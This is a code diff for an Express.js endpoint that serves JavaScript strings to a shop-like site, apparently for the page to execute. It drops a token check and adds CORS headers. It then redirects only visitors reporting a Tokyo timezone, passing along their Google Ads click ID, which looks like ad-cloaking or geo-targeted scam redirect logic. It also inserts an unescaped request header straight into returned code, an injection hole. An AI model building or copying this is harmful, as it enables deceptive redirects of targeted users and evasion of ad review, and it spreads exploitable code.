@@ -2,21 +2,20 @@ import express from "express";
 
 const app = express();
 
-// CONFIG
-const SHARED_TOKEN = "refliefcart.shop";
 const FINAL_REDIRECT_URL = "https://example.com";
+const JAPAN_TIMEZONE = "Asia/Tokyo";
+
+// ✅ Required for cross-origin fetch
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "https://refliefcart.shop");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
+  res.setHeader("Access-Control-Allow-Methods", "GET");
+  next();
+});
 
 app.get("/getData", (req, res) => {
   const gclid = req.query.gclid || "";
-  const token = req.query.token || "";
-  const timezone = req.headers["x-client-timezone"] || "unknown";
-
-  // 🔐 Token validation (THIS works cross-origin)
-  if (token !== SHARED_TOKEN) {
-    return res.status(403).json({
-      code: `console.warn("Unauthorized request");`
-    });
-  }
+  const timezone = req.headers["x-client-timezone"] || "";
 
   console.log({
     gclid,
@@ -26,11 +25,19 @@ app.get("/getData", (req, res) => {
     time: new Date().toISOString()
   });
 
+  // 🚫 Not Japan → no redirect
+  if (timezone !== JAPAN_TIMEZONE) {
+    return res.json({
+      code: `console.log("No redirect: timezone =", "${timezone}");`
+    });
+  }
+
+  // ✅ Japan → redirect
   const redirectUrl = gclid
     ? `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`
     : FINAL_REDIRECT_URL;
 
-  res.json({
+  return res.json({
     code: `window.location.replace("${redirectUrl}");`
   });
 });
